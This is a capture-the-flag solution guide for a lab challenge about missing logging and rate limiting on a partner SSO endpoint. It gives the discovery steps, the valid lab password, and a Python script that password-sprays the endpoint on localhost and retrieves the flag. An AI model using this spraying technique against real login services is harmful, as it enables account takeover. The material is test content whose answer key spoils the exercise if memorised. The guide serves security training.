# A09 Easy: Solution Guide

### Vulnerability Analysis
1. Browse to `/compliance` to discover the external auditor account `sec_auditor` and the 50 approved candidate rotation keys (available at `/compliance/candidates.txt`).
2. Reviewing `/login` reveals that external auditor accounts are prohibited from the web form, and any 3 failed attempts result in an automatic SIEM IP blacklist.
3. Checking `/robots.txt` reveals the OpenAPI documentation (`/api/v1/docs`), the target vault (`/auditor/vault`), and the partner SSO gateway (`/api/v1/sso/`).
4. Inspecting `/api/v1/sso/partner-auth` reveals a critical logging and alerting gap: failed authentication attempts on the partner SSO endpoint do NOT stream to the SIEM and enforce zero rate limiting or blacklisting.
5. An attacker can spray the 50 candidate passwords from `/compliance/candidates.txt` against `/api/v1/sso/partner-auth`. The valid credential is candidate #25 (`ComplianceAuditor2026!`).
6. Once authenticated via SSO, the session cookie grants access to `/auditor/vault` to claim the dynamic flag.

---

### Exploit Script
```python
import re
import requests

BASE_URL = "http://127.0.0.1:6025"
session = requests.Session()

# 1. Download the 50 candidate keys from compliance
wordlist_resp = session.get(f"{BASE_URL}/compliance/candidates.txt")
candidates = [line.strip() for line in wordlist_resp.text.strip().splitlines() if line.strip()]
print(f"[*] Loaded {len(candidates)} candidates from compliance wordlist.")

# 2. Spray candidates against the unmonitored partner SSO endpoint
authenticated = False
for idx, pwd in enumerate(candidates, 1):
    resp = session.post(f"{BASE_URL}/api/v1/sso/partner-auth", json={
        "username": "sec_auditor",
        "password": pwd
    })
    data = resp.json()
    if data.get("success"):
        print(f"[+] Successfully authenticated on candidate #{idx}: {pwd}")
        authenticated = True
        break

assert authenticated, "Failed to authenticate with candidate pool"

# 3. Retrieve flag from auditor vault
vault_resp = session.get(f"{BASE_URL}/auditor/vault")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
